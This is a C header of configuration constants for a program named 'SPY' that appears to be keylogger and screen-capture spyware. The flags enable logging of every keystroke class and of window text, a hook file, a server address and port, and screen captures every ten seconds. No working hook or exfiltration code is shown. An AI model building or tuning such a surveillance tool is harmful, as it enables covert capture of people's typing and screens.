#pragma once

#ifdef WIN32
#define SPY_FILE_SEPARATOR				'\\'
#else
#define SPY_FILE_SEPARATOR				'/'
#endif

#define SPY_MAJOR_VERSION						0	/* add or remove features */
#define SPY_MINOR_VERSION						0	/* change features */
#define SPY_REVISION							0	/* fix bug, increase performance */

#define SPY_AUTO_FFLUSH								/* auto flush data back to hook file when write */
#define SPY_LOG_WINTEXT								/* enable log window text which typed on it */
#define SPY_LOG_NUMBER								/* enable log number keys */
#define SPY_LOG_NUMPAD								/* enable log numpad keys */
#define SPY_LOG_CHARACTER							/* enable log character keys */
#define SPY_LOG_SPECIAL								/* enable log special keys */
#define SPY_LOG_SYMBOL								/* enable log symbol keys */
#define SPY_LOG_UNKNOWN								/* enable log unknown keys */
#define SPY_MAX_WTEXT_LTH				MAX_PATH
#define SPY_TMP_FNAME_LTH				32
#define SPY_TMP_DIR						"C:\\Users\\xuans\\Desktop\\spy"
#define SPY_TMP_KBH_MSZ					20
#define SPY_IO_IN_SZBUFFER				1024
#define SPY_NET_SERVER_ADDR				"localhost"
#define SPY_NET_SERVER_PORT				2512
#define SPY_TMR_CAPSCR_INTERVAL			(10 * 1000)	/* capture screen each...(milliseconds) */
